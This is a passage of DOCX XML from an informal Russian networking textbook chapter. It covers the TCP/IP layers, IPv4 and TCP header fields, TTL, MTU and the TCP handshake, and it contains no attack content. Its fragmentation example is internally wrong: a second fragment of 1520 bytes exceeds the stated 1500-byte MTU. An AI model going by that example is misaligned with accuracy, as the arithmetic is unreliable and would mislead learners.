        <w:t>**Как считать**: длину кабеля, количество свитчей, стоимость, bottleneck.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">В следующей главе разберём </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>протоколы Internet</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (TCP, UDP, HTTP, DNS) — то, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>как</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> данные передаются по этим сетям. Без протоколов твои кабели и свитчи — просто бесполезное железо.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Stay tuned, красавчик! 🚀</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Глава 8.4. Протоколы Internet</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Введение: Как пакеты летают по интернету</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Окей, дружище, мы уже разобрали, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>где</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> находятся устройства (IP-адреса), </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>какие</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> бывают сети (LAN, WAN, GAN) и </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>как</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> они соединены (топологии). Но вот вопрос: как, блять, данные </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>на самом деле</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> передаются? Как твой браузер понимает, что получил именно ту картинку кота, а не порнуху для соседа?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Всё это работает благодаря </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>протоколам</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это типа правила игры. Если два компьютера не договорятся о правилах, они не смогут общаться, даже если соединены кабелем толщиной с руку.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Протокол</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это набор правил, определяющих формат и порядок передачи данных между устройствами.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Эта глава связана с:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Главой 8.01 (Адресация)** — IP-адреса, порты, DNS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Главой 8.02 (Сетевые компоненты)** — роутеры работают на уровне IP, свитчи — на Ethernet</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Главой 8.03 (Топологии)** — протоколы работают поверх физической инфраструктуры</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Главой 8.07 (Модель OSI)** — TCP/IP — это реализация модели OSI</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Главой 9.02 (Криптография)** — HTTPS, TLS/SSL-шифрование</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8.4.1. Стек протоколов TCP/IP: многослойный пирог</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>TCP/IP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это не один протокол, а </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>семейство протоколов</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (protocol suite), которое управляет интернетом. Название происходит от двух ключевых протоколов: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>TCP (Transmission Control Protocol)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> и </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>IP (Internet Protocol)</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Четыре уровня стека TCP/IP</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Протоколы организованы в </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>четыре уровня</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (слоя). Каждый уровень решает свои задачи и общается только с соседними уровнями.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Уровень | Название | Что делает | Примеры протоколов |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|---------|----------|------------|-------------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 4 | Прикладной (Application) | Приложения пользователя | HTTP, HTTPS, FTP, SMTP, DNS, SSH |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 3 | Транспортный (Transport) | Доставка данных между приложениями | TCP, UDP |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 2 | Сетевой (Network/Internet) | Маршрутизация пакетов между сетями | IP (IPv4, IPv6), ICMP, ARP |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1 | Канальный + Физический (Link) | Передача данных по физической среде | Ethernet, Wi-Fi, PPP |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Аналогия</w:t>
      </w:r>
      <w:r>
        <w:t>: Представь, что ты отправляешь посылку через почту:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Прикладной уровень** — ты пишешь письмо (HTTP-запрос)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Транспортный уровень** — кладёшь письмо в конверт с адресом получателя (TCP-сегмент)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Сетевой уровень** — почтальон кладёт конверт в мешок с другими письмами и определяет маршрут (IP-пакет)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Канальный уровень** — мешок грузят в грузовик и везут (Ethernet-кадр)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Каждый уровень добавляет свои </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>заголовки</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (headers), оборачивая данные предыдущего уровня. Это называется </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>инкапсуляция</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8.4.2. IP (Internet Protocol): как пакеты находят дорогу</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>IP (Internet Protocol)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это протокол </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>сетевого уровня</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, отвечающий за </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>маршрутизацию пакетов</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> между сетями. Он знает IP-адреса, но не гарантирует доставку.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Основные функции IP:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Адресация**: каждому устройству присваивается IP-адрес (IPv4 или IPv6)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Маршрутизация**: определение пути от источника к получателю через роутеры</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Фрагментация**: разбиение больших пакетов на меньшие, если канал не поддерживает большой размер</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Структура IP-пакета (IPv4)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">IP-пакет состоит из </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>заголовка</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (header) и </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>данных</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (payload).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Заголовок IPv4 (минимум 20 байт)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Поле | Размер | Описание |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|------|--------|----------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Version | 4 бита | Версия IP (4 для IPv4) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Header Length | 4 бита | Длина заголовка (обычно 20 байт) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Type of Service (ToS) | 8 бит | Приоритет пакета (QoS) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Total Length | 16 бит | Общая длина пакета (заголовок + данные), макс. 65,535 байт |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Identification | 16 бит | ID пакета (для сборки фрагментов) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Flags | 3 бита | Флаги фрагментации (DF = Don't Fragment, MF = More Fragments) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Fragment Offset | 13 бит | Смещение фрагмента |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Time To Live (TTL) | 8 бит | Максимальное количество прыжков (hops) через роутеры |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Protocol | 8 бит | Протокол верхнего уровня (6 = TCP, 17 = UDP, 1 = ICMP) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Header Checksum | 16 бит | Контрольная сумма заголовка |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Source IP Address | 32 бита | IP-адрес отправителя |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Destination IP Address | 32 бита | IP-адрес получателя |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Options | Переменная | Опции (редко используются) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Data | Переменная | Полезная нагрузка (TCP-сегмент, UDP-датаграмма, и т.д.) |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>TTL (Time To Live)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это счётчик жизни пакета. Каждый роутер уменьшает TTL на 1. Если TTL = 0, пакет </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>выбрасывается</w:t>
      </w:r>
      <w:r>
        <w:t>. Это предотвращает бесконечное блуждание пакетов в случае петли маршрутизации.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Ты пингуешь `google.com` из Москвы. TTL = 64. Пакет проходит через 15 роутеров → TTL становится 49. Ответ приходит обратно.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>MTU (Maximum Transmission Unit) и фрагментация</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>MTU (Maximum Transmission Unit)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это максимальный размер пакета, который может быть передан по каналу без фрагментации.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Типичные значения MTU</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Ethernet**: 1500 байт</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Wi-Fi**: 2304 байта (но обычно ограничен 1500)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**PPPoE**: 1492 байта (из-за заголовка PPPoE)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Internet**: обычно 1500 байт</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Если пакет больше MTU, его нужно </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>разбить на фрагменты</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (fragmentation).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: У тебя пакет размером 3000 байт, а MTU канала = 1500 байт.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>IP разбивает пакет на **2 фрагмента**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Фрагмент 1: 1500 байт (заголовок 20 байт + данные 1480 байт)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Фрагмент 2: 1520 байт (заголовок 20 байт + данные 1500 байт)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Каждый фрагмент имеет:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Одинаковый **Identification** (ID)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Флаг **MF (More Fragments)** = 1 для первого, 0 для последнего</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Fragment Offset** указывает позицию фрагмента</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Получатель **собирает фрагменты** обратно в исходный пакет</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема фрагментации</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Если хотя бы </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>один фрагмент потерян</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, весь пакет нужно передавать заново. Поэтому современные протоколы стараются </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>избегать фрагментации</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (используют </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Path MTU Discovery</w:t>
      </w:r>
      <w:r>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8.4.3. TCP (Transmission Control Protocol): надёжная доставка</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>TCP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это протокол </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>транспортного уровня</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, который обеспечивает </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>надёжную, упорядоченную доставку</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> данных.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Основные характеристики TCP:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">✅ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Надёжность</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: TCP гарантирует доставку (если пакет потерялся, он будет отправлен повторно)  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">✅ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Упорядоченность</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: данные приходят в том же порядке, в котором были отправлены  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">✅ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Контроль потока</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: TCP не перегружает получателя (если получатель медленный, отправитель замедлится)  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">✅ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Контроль перегрузки</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: TCP замедляет передачу, если сеть перегружена  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">❌ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Медленнее UDP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: из-за всех этих проверок TCP медленнее UDP  </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Когда использовать TCP:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Веб (HTTP/HTTPS)**: загрузка веб-страниц — важно, чтобы все данные пришли</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Почта (SMTP, IMAP)**: письма должны доставиться полностью</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Передача файлов (FTP, SFTP)**: файл должен быть идентичен оригиналу</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**SSH**: удалённое управление — нельзя терять команды</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Структура TCP-сегмента</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">TCP-сегмент состоит из </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>заголовка</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (минимум 20 байт) и </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>данных</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Заголовок TCP</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Поле | Размер | Описание |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|------|--------|----------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Source Port | 16 бит | Порт отправителя (например, 12345) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Destination Port | 16 бит | Порт получателя (например, 80 для HTTP) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Sequence Number | 32 бита | Номер первого байта данных в этом сегменте |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Acknowledgment Number | 32 бита | Номер следующего ожидаемого байта |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Data Offset | 4 бита | Длина заголовка (обычно 20 байт) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Flags | 9 бит | Флаги: SYN, ACK, FIN, RST, PSH, URG |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Window Size | 16 бит | Размер окна приёма (для контроля потока) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Checksum | 16 бит | Контрольная сумма |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Urgent Pointer | 16 бит | Указатель на срочные данные |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Options | Переменная | Опции (MSS, Window Scale) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Data | Переменная | Полезная нагрузка (HTTP-запрос, и т.д.) |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Трёхстороннее рукопожатие (Three-Way Handshake)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Перед передачей данных TCP устанавливает </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>соединение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> с помощью </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>трёхстороннего рукопожатия</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (3-way handshake).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Шаги</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Клиент → Сервер: SYN**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   "Привет, сервер! Я хочу с тобой соединиться. Мой начальный Sequence Number = 1000."  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Флаг </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>SYN = 1</w:t>
      </w:r>
      <w:r>
        <w:t>, Sequence Number = 1000</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Сервер → Клиент: SYN-ACK**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   "Привет, клиент! Я согласен. Мой Sequence Number = 5000. Подтверждаю твой SYN (ACK = 1001)."  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Флаги </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>SYN = 1, ACK = 1</w:t>
      </w:r>
      <w:r>
        <w:t>, Sequence Number = 5000, Acknowledgment Number = 1001</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Клиент → Сервер: ACK**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   "Отлично, начинаем передачу! Подтверждаю твой SYN (ACK = 5001)."  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Флаг </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ACK = 1</w:t>
      </w:r>
      <w:r>
        <w:t>, Acknowledgment Number = 5001</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Готово!</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Соединение установлено, можно передавать данные.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
